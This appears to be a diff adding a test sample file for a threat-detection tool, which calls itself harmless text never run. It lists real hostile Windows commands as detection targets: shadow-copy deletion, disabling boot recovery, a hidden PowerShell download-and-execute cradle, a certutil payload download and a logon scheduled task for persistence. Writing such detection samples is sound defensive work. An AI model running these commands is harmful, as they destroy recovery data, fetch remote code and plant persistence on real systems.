@@ -1,0 +1,18 @@
+REM ===================================================================
+REM  HARMLESS TEST SAMPLE for Threat Analyzer - this is plain text,
+REM  it is never executed. It only contains strings that the rule
+REM  database is expected to detect.
+REM ===================================================================
+
+REM Ransomware-style recovery sabotage
+vssadmin delete shadows /all /quiet
+bcdedit /set {default} recoveryenabled no
+
+REM PowerShell download cradle with hidden window
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"
+
+REM LOLBin download
+certutil -urlcache -split -f http://198.51.100.23/payload.dat C:\Users\Public\payload.dat
+
+REM Persistence
+schtasks /create /sc onlogon /tn Updater /tr C:\Users\Public\payload.dat
